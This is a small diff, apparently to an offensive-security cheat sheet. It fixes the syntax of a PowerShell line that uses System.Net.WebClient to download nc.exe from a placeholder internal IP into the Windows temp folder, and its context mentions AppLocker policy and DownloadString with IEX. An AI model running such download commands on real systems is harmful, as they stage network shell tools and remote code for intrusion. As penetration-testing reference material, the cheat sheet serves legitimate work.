@@ -400,7 +400,7 @@ Get-AppLockerPolicy -Domain
 Download a file using "System.Net.WebClient" (DownloadFile method):
 
 ```
-(New-Object System.Net.WebClient).DownloadFile('http://10.x.x.x/nc.exe','c:\windows\temp\nc.exe'
+(New-Object System.Net.WebClient).DownloadFile('http://10.x.x.x/nc.exe','c:\windows\temp\nc.exe')   
 ```
 
 Download a file using "System.Net.WebClient" (DownloadString method with IEX cmdlet):
